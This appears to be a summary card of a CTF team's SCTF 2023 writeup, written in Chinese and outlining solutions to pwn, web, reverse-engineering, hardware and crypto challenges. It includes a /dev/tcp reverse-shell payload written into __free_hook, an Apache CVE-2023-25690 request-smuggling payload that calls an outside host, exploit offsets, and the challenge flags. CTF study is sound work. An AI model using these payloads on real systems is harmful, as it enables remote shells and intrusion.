---
title: "SCTF 2023 Writeup - Polaris 战队"
category: misc
tags: ["SCTF 2023", "misc", "pwn", "ret2text", "rust-uaf", "vec-grow"]
signals: ["SCTF 2023 2023", "pwn", "ret2text", "rust-uaf", "vec-grow", "free-hook", "web", "cve-2023-25690", "http-smuggling", "rop", "SCTF", "Polaris", "PWN", "CGI"]
difficulty: hard
source: "https://www.ctfiot.com/121322.html"
tools: ["PHP", "Rust", "Z3"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# SCTF 2023 Writeup - Polaris 战队

> 赛事：SCTF 2023 2023 | 方向：misc | 难度：hard | 工具：PHP、Rust、Z3

## 一句话总结

SCTF 2023 Polaris 战队多方向 WP：PWN CGI ret2text + Rust Vec UAF 改 free_hook + Web CVE-2023-25690 请求走私 + PHP 反序列化 + RE z3 求解 + 硬件电路 + Crypto 椭圆曲线 + AES Padding/MSB Oracle。

## 攻击链

1. PWN ancient_cgi: ret2text 简单栈溢出 + p64(vip=0x401129) + p64(main=0x400FF9) + padding 0xe8
2. POST /vip.cgi with session cookie 触发 ret2vip
3. PWN Brave Knights and Rusty Swords: Rust 逆向 + Vec::grow UAF
4. libc-2.27 + tcache 0x3ed8e8 __free_hook 0x3ed8e8
5. 512 push(6) + grow(0x400) + 多次 UAF free A→B→A 构成回环
6. 改 __free_hook=system + 写 "bash -c 'sh >/dev/tcp/.../... 0>&1 2>&1'" 反弹
7. WEB ezcheck1n: CVE-2023-25690 Apache HTTP Request Smuggling
8. 提示"今年不是2023年" → 2022.php + CRLF HTTP/1.1
9. payload: /2023/1 HTTP/1.1\r\nHost:localhost\r\n\r\nGET /2022.php?url=vps:445/?flag=
10. WEB fumo_backdoor: PHP 反序列化 + O:13:"fumo_backdoor":4:{path/argv/func/class}
11. func=phpinfo → session_start → PHPSESSID=bcbcbc → 触发 readfile
12. RE Syclang: 24 字节 z3 求解, 双层 L/R/X 加减 + 累加 + XOR
13. tmp1_L=[0,15,2,10,6,9,1,4] + tmp1_R=[8,23,11,20,13,21,19,17] + tmp1_X=[11,-13,17,-19,23,-29,31,-37]
14. tmp2_key 同样加减 + 累加
15. 逆向双层: 减法累加还原 tmp3_key
16. s.add(cin[23]==ord('}'), cin[0]==ord('s')) s.check()
17. RE Digital_circuit_learning: 硬件题 + enc() 9 步操作
18. sub_8001A8C 计算 a1=(a1>>6)&(a1>>2) → 1 bit 输出
19. 还原 enc 顺序 bdgfciejha → input 顺序 0x3b 0x77 0x71...
20. flag: SCTF{5149ac8b033d602bf6d3}
21. CRYPTO Barter: 椭圆曲线 + smooth n + 离散对数 e
22. P=114514*Q + rlist[0] 反向 + 恢复 rlist[55]/[66]/[77]/[88]/[99]
23. 爆破 seq 4 bit = 16 种 + 计算 add + xor + 解密
24. flag: SCTF{Th1s_i5_my_happy_s0ng_I_like_to_5ing_it_@ll_day_1ong}
25. CRYPTO Math forbidden: AES-CBC + RSA + 双重 padding oracle + MSB Oracle
26. Padding oracle 解 aeskey → sysKEY = 8 bytes
27. 还原后 adminadmin 拿 N/E/c
28. 260 轮 MSB Oracle 攻击还原 secret

## 关键 payload

```
enc_key = b'bash -c "sh >/dev/tcp/xxxxxx/2333 0>&1 2>&1"' + p64(0) + p64(system) 写 __free_hook
```

## 经验教训

Rust Vec::grow UAF 是 Rust 二进制程序漏洞常见入口；CVE-2023-25690 Apache HTTP 请求走私是 web 经典高阶利用；MSB Oracle + Padding Oracle 组合攻击 RSA+AES 是 CBC+RSA 联合加密场景必备技巧。

## 标签

pwn、ret2text、rust-uaf、vec-grow、free-hook、web、cve-2023-25690、http-smuggling、php-unserialize、fuzzilli、rev-z3、hardware-circuit、crypto-pad-oracle、msb-oracle

## 参考来源

- https://www.ctfiot.com/121322.html
- 原文件：SCTF_2023_Writeup_-Polaris战队.full.md
